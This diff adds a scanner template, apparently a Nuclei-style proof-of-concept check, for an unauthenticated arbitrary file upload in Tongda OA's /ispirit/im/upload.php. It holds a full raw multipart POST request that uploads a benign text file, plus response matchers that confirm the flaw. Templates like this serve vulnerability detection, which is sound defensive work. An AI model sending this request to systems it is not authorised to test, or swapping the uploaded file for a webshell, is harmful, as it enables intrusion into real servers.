@@ -1,0 +1,58 @@
+id: poc-yaml-todo-oa-arbitrary-file-upload
+info:
+  name: Toda OA Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /ispirit/im/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        DNT: 1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnBC9fNE0xAOdxca
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        ------WebKitFormBoundaryVnBC9fNE0xAOdxca
+        Content-Disposition: form-data; name="P"
+
+        admin
+        ------WebKitFormBoundaryVnBC9fNE0xAOdxca
+        Content-Disposition: form-data; name="TYPE"
+
+        mobile1
+        ------WebKitFormBoundaryVnBC9fNE0xAOdxca
+        Content-Disposition: form-data; name="DEST_UID"
+
+        12334
+        ------WebKitFormBoundaryVnBC9fNE0xAOdxca
+        Content-Disposition: form-data; name="UPLOAD_MODE"
+
+        2
+        ------WebKitFormBoundaryVnBC9fNE0xAOdxca
+        Content-Disposition: form-data; name="$DURATION"
+
+        2
+        ------WebKitFormBoundaryVnBC9fNE0xAOdxca
+        Content-Disposition: form-data; name="ATTACHMENT"; filename="123.txt"
+        Content-Type: text/plain
+
+        123
+        ------WebKitFormBoundaryVnBC9fNE0xAOdxca--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "+OK [vm]"
+      - type: word
+        words:
+          - "123.txt"
+      - type: word
+        words:
+          - "[/vm]"
